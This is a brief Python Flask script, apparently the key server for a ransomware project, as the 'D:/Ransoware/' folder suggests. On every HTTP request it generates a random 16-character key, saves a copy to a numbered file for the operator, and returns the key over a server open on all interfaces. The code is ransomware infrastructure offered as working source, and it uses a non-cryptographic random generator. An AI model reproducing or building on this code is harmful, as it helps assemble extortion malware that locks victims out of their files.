#!/usr/bin/env python
import random, os
from flask import Flask

app = Flask(__name__)

profile = 100000

@app.route("/")

def inicio():
	global profile
	profile = profile + 1
	x = "abcdefghijklmnopqrstuvwxyz01234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()?¨*][>?="
	length = 16
	key =  "".join(random.sample(x,length))
	f = open("D:/Ransoware/"+ str(profile) + ".txt", "w")
	f.write(key)
	f.close()
	return key 

if __name__ == '__main__':
	app.run(host='0.0.0.0')